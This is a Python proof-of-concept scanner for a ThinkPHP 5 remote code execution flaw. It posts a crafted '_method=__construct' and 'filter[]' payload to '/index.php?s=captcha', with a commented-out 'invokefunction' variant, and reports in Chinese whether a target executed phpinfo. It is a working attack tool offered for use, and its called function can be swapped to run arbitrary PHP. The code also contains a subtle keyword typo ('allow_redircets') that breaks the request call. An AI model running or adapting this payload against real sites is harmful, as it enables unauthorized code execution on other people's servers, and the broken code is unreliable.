import argparse
import textwrap
import requests
import sys
requests.packages.urllib3.disable_warnings()

def main(url,func="phpinfo"):
    full_url = f"{url}/index.php?s=captcha"
    headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                     "Accept-Encoding": "gzip, deflate",
                     "Accept-Language": "zh-CN,zh;q=0.9",
                     "Connection": "close",
                     "Content-Type": "application/x-www-form-urlencoded"}
    data = {"_method": "__construct", "filter[]": f"{func}", "method": "get", "server[REQUEST_METHOD]": "-1"}
    # response = requests.post(full_url, headers=headers)
    # full_url = rf"{url}/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
    try:
        response = requests.post(full_url, headers=headers,data=data,verify=False,timeout=5,allow_redircets=False)
        # response = requests.get(full_url,timeout=5)
    except Exception:
        print(f"[-]{url}请求失败")
        sys.exit(1)
    if response.status_code == 200 and "PHP Extension Build" in response.text:
        print(f"[+]{url}存在thinkphp5—rce漏洞")
    else:
        print(f"[-]{url}不存在该漏洞")

if __name__ == '__main__':
    banner = """
     _   _     _       _          _          ____                 
| |_| |__ (_)_ __ | | ___ __ | |__  _ __| ___|   _ __ ___ ___ 
| __| '_ \| | '_ \| |/ / '_ \| '_ \| '_ \___ \  | '__/ __/ _ \\
| |_| | | | | | | |   <| |_) | | | | |_) |__) | | | | (_|  __/
 \__|_| |_|_|_| |_|_|\_\ .__/|_| |_| .__/____/  |_|  \___\___|
                       |_|         |_|  
                                                version: 0.0.1
                                                author:  liyanyu
    """
    print(banner)
    parser = argparse.ArgumentParser(description="thinkphp5 rec poc",formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent('''example:
    python3 Thinkphp5_rce.py -u http://192.168.0.1
                                     '''))
    parser.add_argument('-u',"--url",dest='url',help='input the url')
    args = parser.parse_args()
    main(args.url)
